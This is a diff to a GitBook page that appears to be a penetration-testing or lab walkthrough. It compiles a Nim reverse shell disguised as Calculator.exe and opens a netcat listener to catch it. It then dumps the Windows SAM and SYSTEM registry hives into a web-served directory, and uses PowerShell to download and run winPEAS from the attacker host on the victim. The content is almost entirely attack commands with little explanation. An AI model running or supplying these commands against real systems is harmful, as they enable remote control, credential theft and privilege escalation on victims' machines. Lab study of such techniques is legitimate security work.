@@ -155,15 +155,14 @@ cd Nim-Reverse-Shell/
 <strong>apt install mingw-w64 -y
 </strong>curl https://nim-lang.org/choosenim/init.sh -sSf | sh
 subl rev_shell.nim
-/root/.nimble/bin/nim c -d:mingw-w64  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
 </code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali #1**
 
 ```
-/root/.nimble/bin/nim c -d:mingw-w64  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
+/root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
 ```
 
 **Kali #2**
@@ -172,9 +171,24 @@ subl rev_shell.nim
 rlwrap nc -lvnp 443
 ```
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
+#### &#x20;<a href="#transfer-winpeas" id="transfer-winpeas"></a>
 
+**Kali**
 
+```
+reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
+reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
+```
+
+**Victim**
+
+```
+cd C:\Users\natbat\Desktop
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/winPEASx64.exe','winPEASx64.exe')" 
+winPEASx64.exe
+```
 
